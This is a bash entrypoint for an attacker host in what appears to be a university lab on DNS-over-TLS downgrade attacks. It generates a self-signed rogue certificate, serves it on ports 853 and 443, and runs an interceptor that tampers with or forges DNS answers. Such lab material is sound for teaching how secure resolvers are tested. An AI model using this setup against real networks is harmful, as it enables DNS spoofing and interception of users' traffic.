#!/bin/bash
set -e

# We never forward at the IP layer; the pcap interceptor is the relay, and for
# the rogue-cert attack a userspace TLS server terminates the diverted DoT.
sysctl -w net.ipv4.ip_forward=0 >/dev/null

export ATTACKER_IP="${ATTACKER_IP:-172.16.1.100}"
export CLIENT_IPS="${CLIENT_IPS:-172.16.1.10,172.16.1.11}"
HOSTNAME_TLS="resolver.cs6008.local"

# A rogue, UNTRUSTED certificate for the resolver's name (self-signed by the
# attacker -- NOT issued by the lab CA). Used only for the rogue-cert attack.
ROGUE=/rogue
mkdir -p "$ROGUE"
if [ ! -s "$ROGUE/rogue.pem" ]; then
    openssl ecparam -name prime256v1 -genkey -noout -out "$ROGUE/rogue.key"
    openssl req -x509 -new -key "$ROGUE/rogue.key" -sha256 -days 365 \
        -subj "/CN=${HOSTNAME_TLS}" \
        -addext "subjectAltName = DNS:${HOSTNAME_TLS}" -out "$ROGUE/rogue.pem"
fi

ATTACK="${ATTACK:-none}"
echo "[attacker] ATTACK=${ATTACK} attacker_ip=${ATTACKER_IP} clients=${CLIENT_IPS}"

case "$ATTACK" in
    none)        mode=normal ;;                 # just relay (7.2 verify)
    alter)       mode=tamper ;;                 # (i) corrupt the DoT stream + forge the 53 fallback
    rogue-cert)  mode=forge ;;                  # (ii) forge the 53 fallback; rogue TLS below
    block)       mode=forge ;;                  # (iii) forge the 53 fallback
    *) echo "[attacker] unknown ATTACK=${ATTACK}" >&2; exit 1 ;;
esac

# (ii) rogue-cert: stand up a TLS server presenting the UNTRUSTED cert on the
# DoT/DoH ports. The client validates against the lab CA + hostname, so the
# handshake is rejected -- a strict client then has no answer, a permissive
# client downgrades to cleartext (which the interceptor forges).
if [ "$ATTACK" = "rogue-cert" ]; then
    echo "[attacker] starting rogue TLS endpoints (853/443) with untrusted cert"
    openssl s_server -quiet -naccept 1000 -accept 853 \
        -cert "$ROGUE/rogue.pem" -key "$ROGUE/rogue.key" >/dev/null 2>&1 &
    openssl s_server -quiet -naccept 1000 -accept 443 \
        -cert "$ROGUE/rogue.pem" -key "$ROGUE/rogue.key" >/dev/null 2>&1 &
fi

echo "[attacker] interceptor mode=${mode}"
exec ./interceptor "${mode}"
